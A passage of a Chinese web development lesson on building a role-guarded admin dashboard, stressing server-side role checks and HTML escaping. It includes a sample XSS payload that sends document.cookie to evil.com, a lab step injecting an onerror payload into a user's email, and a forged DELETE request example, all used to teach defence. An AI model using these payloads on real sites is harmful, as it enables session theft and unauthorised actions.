  // 403：登录了但没权限 → 不跳转，显示提示
  if (response.status === 403) {
    return { ok: false, status: 403, data: { error: "你没有权限访问这个功能" } };
  }

  let data = null;

  try {
    data = await response.json();
  } catch {
    data = null;
  }

  return { ok: response.ok, status: response.status, data };
};

// ============ 2. 格式化 ============

/**
 * ISO 时间 → "2026-11-16 17:31"
 * 注意：数据库存的是 UTC，这里转成本地时间显示。
 */
export const fmtTime = (iso) => {
  if (!iso) return "-";

  const date = new Date(iso);
  if (Number.isNaN(date.getTime())) return "-";

  const pad = (value) => String(value).padStart(2, "0");

  return (
    `${date.getFullYear()}-${pad(date.getMonth() + 1)}-${pad(date.getDate())} ` +
    `${pad(date.getHours())}:${pad(date.getMinutes())}`
  );
};

/** ISO 时间 → "3 分钟前" */
export const fmtAgo = (iso) => {
  if (!iso) return "-";

  const diff = Date.now() - new Date(iso).getTime();

  if (Number.isNaN(diff)) return "-";
  if (diff < 0) return "刚刚";
  if (diff < 60 * 1000) return "刚刚";
  if (diff < 60 * 60 * 1000) return `${Math.floor(diff / 60000)} 分钟前`;
  if (diff < 24 * 60 * 60 * 1000) return `${Math.floor(diff / 3600000)} 小时前`;
  if (diff < 30 * 24 * 60 * 60 * 1000) return `${Math.floor(diff / 86400000)} 天前`;

  return fmtTime(iso);
};

/** 数字加千分位 */
export const fmtNumber = (value) => Number(value || 0).toLocaleString("zh-CN");

/**
 * HTML 转义。任何"插入到 innerHTML"的用户数据都必须过这个函数。
 * 不加就是 XSS 漏洞。
 */
export const esc = (text) =>
  String(text ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");

// ============ 3. 侧栏 ============

const NAV_ITEMS = [
  { href: "/admin/index.html", label: "总览", key: "index" },
  { href: "/admin/users.html", label: "用户", key: "users" },
  { href: "/admin/logs.html", label: "日志", key: "logs" },
];

export const renderSidebar = (current, user) => {
  const nav = NAV_ITEMS.map(
    (item) =>
      `<a href="${item.href}" class="${item.key === current ? "active" : ""}">${item.label}</a>`
  ).join("");

  const html = `
    <div class="brand">
      管理后台
      <small>auth-lab</small>
    </div>
    <nav class="nav">
      ${nav}
      <div class="divider"></div>
      <a href="/index.html">返回前台</a>
    </nav>
    <div class="foot">
      <div class="who" title="${esc(user.email)}">${esc(user.nickname || user.email)}</div>
      <button id="logout-btn">登出</button>
    </div>
  `;

  const sidebar = document.querySelector(".sidebar");
  if (sidebar) sidebar.innerHTML = html;

  const logoutBtn = document.getElementById("logout-btn");
  if (logoutBtn) {
    logoutBtn.addEventListener("click", async () => {
      await fetch("/api/logout", { method: "POST", credentials: "same-origin" });
      window.location.href = "/login.html";
    });
  }
};

// ============ 4. 门卫 ============

/**
 * 首屏守卫。每个后台页面第一行调用它。
 * 返回当前用户；如果没权限，会跳到对应页面并返回 null。
 */
export const guard = async () => {
  const result = await api("/api/me");

  if (!result.ok || !result.data?.user) {
    // api() 里已经处理了 401 跳转，这里只兜底
    if (result.status !== 401) {
      window.location.href = "/login.html?next=/admin/index.html";
    }
    return null;
  }

  const user = result.data.user;

  // 不是管理员 → 不给进后台页面
  if (user.role !== "admin") {
    document.body.innerHTML = `
      <div class="center-box">
        <div style="font-size:15px;color:#b91c1c;font-weight:600;margin-bottom:8px">
          没有访问权限
        </div>
        <div style="font-size:13px;margin-bottom:16px">
          这个页面只有管理员可以访问。当前账号角色：${esc(user.role)}
        </div>
        <a class="btn primary" href="/index.html">返回首页</a>
      </div>
    `;
    return null;
  }

  return user;
};

// ============ 5. 提示条 ============

export const showAlert = (el, text, type = "error") => {
  if (!el) return;

  el.textContent = text;
  el.className = `alert ${type} show`;

  if (type === "ok") {
    setTimeout(() => {
      el.classList.remove("show");
    }, 3000);
  }
};

export const hideAlert = (el) => {
  if (el) el.classList.remove("show");
};
```

## 4.2 五个关键点

### 关键点一：`credentials: "same-origin"`

**第 52 节讲过。不写这个，`fetch` 不发送 Cookie，每个请求都是 401。**

**封装在 `api()` 里，所有页面自动带上，不会忘。**

### 关键点二：401 和 403 分开处理

```javascript
if (response.status === 401) { 跳登录 }
if (response.status === 403) { 返回错误，不跳转 }
```

**为什么 403 不跳转：**

**如果非管理员被踢到登录页，他会以为"密码记错了"，反复登录。**

**显示"没有权限"才是对的。**

### 关键点三：`esc()` 是防 XSS 的

**这一条是今天的隐藏重点。**

**如果你这么写：**

```javascript
tbody.innerHTML = users.map((user) => `<tr><td>${user.nickname}</td></tr>`).join("");
```

**用户把昵称设成：**

```html
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

**这段 HTML 会被执行。虽然 Cookie 是 HttpOnly 读不到，但攻击者能：**

```text
① 用受害者的身份去调后台接口（Cookie 会自动带）
② 比如发一个 DELETE 请求删掉所有用户
```

**所以每个插入 `innerHTML` 的用户数据都必须 `esc()`。**

**规则：`${ }` 里凡是来自数据库或用户输入的数据，一律 `esc()` 包一层。**

**这一条以后每一节课都会强调。**

### 关键点四：`guard()` 用 `document.body.innerHTML` 覆盖

**为什么这么做：**

**简单、彻底。** 不用隐藏元素、不用管理一堆 DOM 状态。

**代价：用户看到一瞬间的页面内容，然后被覆盖。**

**更严格的做法是"页面内容全由 JS 渲染"（先不写 HTML，等 `guard()` 通过再渲染）。** 第 58 节会这么改。

**今天先用覆盖法，够用。**

### 关键点五：`export` + `type="module"`

**`admin.js` 用了 `export`，所以页面里必须这样引入：**

```html
<script type="module" src="/admin.js"></script>
```

**注意 `type="module"`。**

**不写的话，`export` 会报语法错误：**

```text
Uncaught SyntaxError: Unexpected token 'export'
```

**而且 module 脚本默认是"延迟执行"（defer），所以 DOM 已经就绪，不用担心。**

---

# 第 5 步：写总览页（25 分钟）

## 5.1 新建 `public/admin/index.html`

**注意目录：`public/admin/`，不是 `public/`。**

**自己敲：**

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>总览 · 管理后台</title>
  <link rel="stylesheet" href="/admin.css" />
</head>
<body>
  <div class="layout">
    <aside class="sidebar"></aside>

    <main class="main">
      <div class="page-head">
        <div>
          <h1>总览</h1>
          <div class="sub" id="sub">加载中……</div>
        </div>
        <button id="refresh" class="small">刷新</button>
      </div>

      <div class="alert" id="alert"></div>

      <div class="cards" id="cards">
        <div class="card">
          <div class="label">用户总数</div>
          <div class="value"><span class="skeleton" style="display:inline-block;width:60px"></span></div>
        </div>
        <div class="card">
          <div class="label">管理员</div>
          <div class="value"><span class="skeleton" style="display:inline-block;width:40px"></span></div>
        </div>
        <div class="card">
          <div class="label">今日新增</div>
          <div class="value"><span class="skeleton" style="display:inline-block;width:40px"></span></div>
        </div>
        <div class="card">
          <div class="label">内容总数</div>
          <div class="value"><span class="skeleton" style="display:inline-block;width:50px"></span></div>
        </div>
      </div>

      <div class="panel">
        <div class="panel-head">
          <h2>服务状态</h2>
        </div>
        <div class="panel-body" id="status">
          <div class="skeleton" style="width:200px"></div>
        </div>
      </div>

      <div class="panel">
        <div class="panel-head">
          <h2>接下来做什么</h2>
        </div>
        <div class="panel-body" style="font-size:13px;color:#4b5563;line-height:1.9">
          第 58 节：用户列表<br />
          第 59 节：搜索与筛选<br />
          第 60 节：分页<br />
          第 61 节：编辑与删除
        </div>
      </div>
    </main>
  </div>

  <script type="module">
    import { guard, renderSidebar, api, esc, fmtNumber, fmtTime, showAlert } from "/admin.js";

    const alertEl = document.getElementById("alert");
    const subEl = document.getElementById("sub");
    const cardsEl = document.getElementById("cards");
    const statusEl = document.getElementById("status");

    const renderCards = (data) => {
      cardsEl.innerHTML = `
        <div class="card">
          <div class="label">用户总数</div>
          <div class="value">${fmtNumber(data.users.total)}</div>
          <div class="sub">不含已删除</div>
        </div>
        <div class="card">
          <div class="label">管理员</div>
          <div class="value">${fmtNumber(data.users.admins)}</div>
          <div class="sub">含你自己</div>
        </div>
        <div class="card">
          <div class="label">今日新增</div>
          <div class="value">${fmtNumber(data.users.newToday)}</div>
          <div class="sub">按本地 0 点算</div>
        </div>
        <div class="card">
          <div class="label">内容总数</div>
          <div class="value">${fmtNumber(data.items.total)}</div>
          <div class="sub">其中公开 ${fmtNumber(data.items.public)} 条</div>
        </div>
      `;
    };

    const renderStatus = (ping, user) => {
      statusEl.innerHTML = `
        <table>
          <tbody>
            <tr><td style="width:120px;color:#6b7280">当前操作人</td><td>${esc(user.email)}</td></tr>
            <tr><td style="color:#6b7280">角色</td><td><span class="tag blue">${esc(user.role)}</span></td></tr>
            <tr><td style="color:#6b7280">服务器时间</td><td>${fmtTime(ping.serverTime)}</td></tr>
            <tr><td style="color:#6b7280">登录状态</td><td><span class="tag green">正常</span></td></tr>
          </tbody>
        </table>
      `;
    };

    const load = async () => {
      hideAll();
      subEl.textContent = "加载中……";

      const [overview, ping] = await Promise.all([
        api("/api/admin/overview"),
        api("/api/admin/ping"),
      ]);

      if (!overview.ok) {
        subEl.textContent = "";
        showAlert(alertEl, overview.data?.error || "加载失败", "error");
        return;
      }

      renderCards(overview.data);
      subEl.textContent = `数据更新于 ${fmtTime(new Date().toISOString())}`;

      if (ping.ok) {
        renderStatus(ping.data, ping.data.operator);
      }
    };

    const hideAll = () => {
      document.getElementById("alert").classList.remove("show");
    };

    const main = async () => {
      const user = await guard();
      if (!user) return;

      renderSidebar("index", user);

      document.getElementById("refresh").addEventListener("click", load);

      await load();
    };

    main();
  </script>
</body>
</html>
```

## 5.2 三个关键点

### 关键点一：`Promise.all` 让两个请求并行

```javascript
const [overview, ping] = await Promise.all([
  api("/api/admin/overview"),
  api("/api/admin/ping"),
]);
```

**为什么不用两个 `await` 串行：**

```text
串行：等 A 完（200ms）→ 再等 B 完（200ms）= 400ms
并行：两个同时发，等最慢的（200ms）= 200ms
```

**快一倍。** 而且这两个接口没有依赖关系，没理由串行。

**规则：没有依赖的异步操作，用 `Promise.all`。**

### 关键点二：加载状态用骨架屏，不用"加载中"

**页面上先放骨架（`<span class="skeleton">`），数据回来再替换。**

**用户看到的是"灰条 → 数字"，而不是"空白 → 数字"。**

**这个差别在慢网络下感知很明显。**

### 关键点三：`hideAll()` 在 `load()` 开头清提示

**为什么要清：**

**用户点"刷新"两次，第一次失败显示红色提示，第二次成功 —— 提示还在。**

**用户会以为"还是失败的"。**

**每次加载先清提示，是最基本的交互卫生。**

## 5.3 打开页面

**浏览器访问：**

```text
http://localhost:4030/admin/index.html
```

**用 Alice 登录过的话，应该直接看到：**

```text
┌──────────┬─────────────────────────────────┐
│ 管理后台  │ 总览              [刷新]         │
│ auth-lab │ 数据更新于 2026-11-16 17:24      │
│          │                                 │
│ 总览 ←   │ ┌──────┐┌──────┐┌──────┐┌──────┐│
│ 用户     │ │用户 2││管理员1││今日 0││内容 4││
│ 内容     │ └──────┘└──────┘└──────┘└──────┘│
│ 日志     │                                 │
│ ─────    │ 服务状态                         │
│ 返回前台  │ 当前操作人  alice@example.com    │
│          │ 角色       [admin]               │
│ alice    │ 服务器时间 2026-11-16 17:24      │
│ [登出]    │                                 │
└──────────┴─────────────────────────────────┘
```

**如果数字全是 0，说明你的 `deleted_at` 字段刚加，或者数据库被重置了。跑一次 `db:seed`。**

---

# 第 6 步：五个必须知道的坑（25 分钟）

## 坑 1：页面守卫做了，接口忘了

**这是本节最重要的一条。**

**你会写：**

```javascript
const user = await guard();
if (!user || user.role !== "admin") return;   // 页面挡住了
```

**但如果你忘了给 `/api/admin/overview` 挂 `requireRole`：**

```text
攻击者不需要你的页面
他直接在终端 curl http://你的站/api/admin/overview -H "Cookie: 普通用户的token"
→ 拿到全部统计数据
```

**排查方法（现在就跑）：**

```text
grep -n "api/admin" src/app.js src/*.js
```

**或者更直接，用 PowerShell：**

```powershell
Select-String -Path src\*.js -Pattern "api/admin|adminRouter\." 
```

**你应该看到 `adminRouter.use(requireAuth)` 和 `adminRouter.use(requireRole("admin"))` 两行。**

**没有这两行，就是漏洞。**

**第二遍说：这是本节的核心。门锁在服务端，不在页面里。**

## 坑 2：`type="module"` 忘了写

```html
<!-- 错 -->
<script src="/admin.js"></script>

<!-- 对 -->
<script type="module" src="/admin.js"></script>
```

**报错：**

```text
Uncaught SyntaxError: Unexpected token 'export'
```

**因为普通脚本不支持 `export`。**

**这个错很常见，而且提示不直观。**

## 坑 3：路径写成相对路径

**页面在 `/admin/index.html`，如果你这么引：**

```html
<link rel="stylesheet" href="admin.css" />
```

**浏览器会去找 `/admin/admin.css` → 404 → 页面没样式。**

**正确：**

```html
<link rel="stylesheet" href="/admin.css" />      <!-- 绝对路径 -->
```

**规则：后台页面里所有静态资源用 `/` 开头的绝对路径。**

**为什么：**

```text
/admin/index.html  → 相对 "admin.css" = /admin/admin.css  ❌
/admin/users.html  → 相对 "admin.css" = /admin/admin.css  ❌
/admin/            → 相对 "admin.css" = /admin/admin.css  ❌
```

**全错。加 `/` 就对了。**

## 坑 4：`res.json` 里的 `BigInt`

**`COUNT(*)` 在某些环境返回 BigInt。**

**报错：**

```text
TypeError: Do not know how to serialize a BigInt
```

**这个错发生在 `res.json()` 内部，堆栈里看不出是你的哪个字段。**

**排查：**

```javascript
console.log(typeof users.total);   // 如果打印 "bigint"，就是它
```

**修法：** 每个 `COUNT` 结果都 `Number()` 一次。`admin.js` 里已经这么做了。

## 坑 5：`guard()` 和 `renderSidebar()` 的顺序

```javascript
// 错
renderSidebar("index", user);   // user 是 undefined → 报错
const user = await guard();

// 对
const user = await guard();
if (!user) return;
renderSidebar("index", user);
```

**`guard()` 在没权限时返回 `null`，必须 `if (!user) return;`。**

**不加判断，`renderSidebar` 里 `user.email` 会报 `Cannot read properties of null`。**

**而这个错误发生在 `guard()` 已经把页面覆盖成"没有权限"之后 —— 用户看到正常的拒绝页，但控制台有红色错误。**

**看起来没事，实际有 bug。** 这种"看起来没事的错误"最难发现。

---

# 第 7 步：故意做五个实验（25 分钟）

## 实验 1：去掉 `requireRole`，看漏洞长什么样

**打开 `src/admin-routes.js`，把这一行注释掉：**

```javascript
// adminRouter.use(requireRole("admin"));
```

**重启服务（`Ctrl + C` 然后 `npm run dev`）。**

**然后用 Bob 的 Cookie：**

```text
curl.exe http://localhost:4030/api/admin/overview -H "Cookie: auth_token=Bob的token"
```

**你会看到：**

```json
{"users":{"total":2,"admins":1,"newToday":0},...}
```

**200。普通用户拿到了管理员的数据。**

**这就是"只做页面守卫"的后果。**

**改回来，重启，再试，应该 403。**

## 实验 2：把 403 改成 401

**打开 `src/auth.js`，找到 `requireRole`，把 `403` 改成 `401`。**

**重启，用 Bob 的 Cookie 调接口。**

**然后打开浏览器，用 Bob 登录，访问：**

```text
http://localhost:4030/admin/index.html
```

**你会看到页面先渲染了一下，然后跳转到登录页。**

**用户感受：**

```text
"我明明是登录状态，为什么让我重新登录？"
"我输密码，还是跳回来。账号坏了？"
```

**这就是第 8 周讲的"为什么权限不足不能用 401"。**

**改回来。**

## 实验 3：去掉 `esc()`，注入一段 HTML

**找到 `index.html` 里这一行：**

```javascript
<tr><td style="color:#6b7280">当前操作人</td><td>${esc(user.email)}</td></tr>
```

**把 `esc(user.email)` 改成 `user.email`。**

**然后去数据库把 Alice 的 email 改成一个"恶意值"：**

```text
node --env-file=.env -e "import('./src/db.js').then(m => { m.db.prepare('UPDATE users SET email=? WHERE id=1').run('<img src=x onerror=alert(1)>@x.com'); console.log('done'); })"
```

**刷新后台页面。**

**你会看到浏览器弹出 `alert(1)`。**

**这就是 XSS。**

**攻击者能做的比 `alert` 严重得多：**

```javascript
// 用你的身份删掉所有用户
fetch("/api/admin/users/2", { method: "DELETE", credentials: "same-origin" });
```

**改回来，恢复数据库：**

```text
node --env-file=.env -e "import('./src/db.js').then(m => { m.db.prepare('UPDATE users SET email=? WHERE id=1').run('alice@example.com'); console.log('done'); })"
```

**把 `esc()` 加回去。**

## 实验 4：删掉 `credentials: "same-origin"`

**打开 `public/admin.js`，把 `api()` 里的 `credentials: "same-origin"` 注释掉。**

**刷新页面。**

**你会看到：所有请求 401 → 跳登录页 → 登录成功 → 又 401 → 死循环。**

**为什么：**

**`fetch` 默认不带 Cookie。所以 `/api/me` 永远 401，永远跳登录。**

**这就是第 52 节的坑，在这里会以"无限跳转"的形式出现。**

**加回来。**

## 实验 5：静态资源用相对路径

**把 `index.html` 里的：**

```html
<link rel="stylesheet" href="/admin.css" />
```

**改成：**

```html
<link rel="stylesheet" href="admin.css" />
```

**刷新页面。**

**页面变成白底黑字、没有布局。**

**F12 → Network → 看到 `admin.css` 是 404。**

**看请求的 URL：`/admin/admin.css`。**

**这就是坑 3。**

**改回来。**

---

# 第 8 步：写笔记（10 分钟）

**`NOTES.md` 必填：**

1. 401 / 403 / 200 三次 curl 的结果（贴真实输出）
2. 去掉 `requireRole` 后 Bob 能拿到什么（贴响应）
3. XSS 实验的现象
4. 「卡在哪」

---

# 第 9 步：课后练习

## 练习一：给后台加"最后登录时间"

**要求：**

1. 给 `users` 表加 `last_login_at` 字段（迁移 009）
2. 登录成功时更新它
3. 后台总览页显示"最近 5 个登录的用户"

**为什么做这个：** 这是客户最常问的"谁最近在用"。

**要点：** `UPDATE users SET last_login_at = ? WHERE id = ?`，然后在 `getOverview` 里加一个查询。

## 练习二：加一个"危险操作确认"

**要求：** 做一个通用函数：

```javascript
export const confirmAction = (message) => window.confirm(message);
```

**然后在任何"删除"按钮里先用它。**

**为什么不用花哨的自定义弹窗：**

**`window.confirm` 丑，但它是浏览器原生，无法被绕过，且在移动端体验正确。**

**等你有真实的删除功能时（第 61 节），再考虑做成自定义弹窗。**

## 练习三：把侧栏抽成"配置驱动"

**现状：`NAV_ITEMS` 是写死的数组。**

**要求：** 改成从 `/api/admin/ping` 返回的"当前用户能看哪些菜单"。

**为什么：** 第 62 节会做"按钮级权限"，菜单也要跟着变。

**这一步是给第 62 节铺路。**

## 练习四：想清楚这四个问题

```text
1. 为什么"页面守卫"和"接口守卫"必须都做，而接口守卫更重要？
2. 为什么 403 不能改打成 401？
3. `esc()` 不写会发生什么？攻击者最想做什么？
4. `min-width: 0` 不加，表格很宽时页面会怎样？
```

---

# 第 10 步：最终验收

## A. 环境

- [ ] 在正确的 `auth-lab` 目录里跑命令
- [ ] `npm run dev` 能启动，看到迁移 008
- [ ] Alice 的 `role` 是 `admin`
- [ ] 能登录拿到 Cookie

## B. 接口

- [ ] `GET /api/admin/overview` 不带 Cookie → 401
- [ ] 带 Bob 的 Cookie → 403
- [ ] 带 Alice 的 Cookie → 200 + 四个数字
- [ ] `admin-routes.js` 有 `adminRouter.use(requireAuth)` 和 `requireRole("admin")`
- [ ] `app.js` 有 `app.use("/api/admin", adminRouter)`

## C. 页面

- [ ] `/admin/index.html` 能打开
- [ ] 侧栏显示三个菜单 + 当前高亮
- [ ] 四张卡片有真实数字
- [ ] "服务状态"表显示操作人和时间
- [ ] 用 Bob 登录后访问，显示"没有访问权限"
- [ ] 样式正常（说明 `/admin.css` 加载成功）

## D. 安全

- [ ] 我做过"去掉 requireRole"的实验，看到 200
- [ ] 我做过 XSS 实验，看到 alert 弹出
- [ ] 所有插入 innerHTML 的动态数据都过了 `esc()`
- [ ] `api()` 有 `credentials: "same-origin"`

## E. 认知

- [ ] 我能说清 401 / 403 / 200 的区别
- [ ] 我知道为什么接口守卫比页面守卫重要
- [ ] 我知道 `type="module"` 为什么必须写
- [ ] 我知道 `min-width: 0` 解决什么问题

## 本节课要能说出口的一句话

> **后台的第一行代码不是表格，是 `requireRole("admin")`。页面挡住的是手，接口挡住的是人。**

---

# 附：常见问题速查

| 情况 | 原因 | 怎么做 |
|---|---|---|
| `no such column: deleted_at` | 迁移 008 没跑 | 重启服务 |
| 页面没样式 | 静态资源用了相对路径 | 加 `/` 前缀 |
| `Unexpected token 'export'` | `<script>` 少了 `type="module"` | 加上 |
| 一直跳登录页 | `fetch` 没带 Cookie | 加 `credentials` |
| 403 但不知道原因 | 角色不对 | 查数据库 `role` 字段 |
| `Do not know how to serialize a BigInt` | `COUNT` 返回 BigInt | `Number()` 包一层 |
| `Cannot read properties of null` | `guard()` 返回 null 没判断 | `if (!user) return;` |
| 数字显示成 `2` 不是 `2`（对） | 正常 | — |
| "今日新增"永远是 0 | 时区算错 | 用 `new Date("YYYY-MM-DDT00:00:00")` |
| `EADDRINUSE :::4030` | 端口被占 | 关旧进程或改 `.env` 的 PORT |
| 改了代码没生效 | 没重启 | `Ctrl + C` 再 `npm run dev` |
| 侧栏是空的 | `renderSidebar` 没调 | 检查 `main()` |
| 数字卡片一直是骨架 | 接口失败 | 看 F12 → Network |
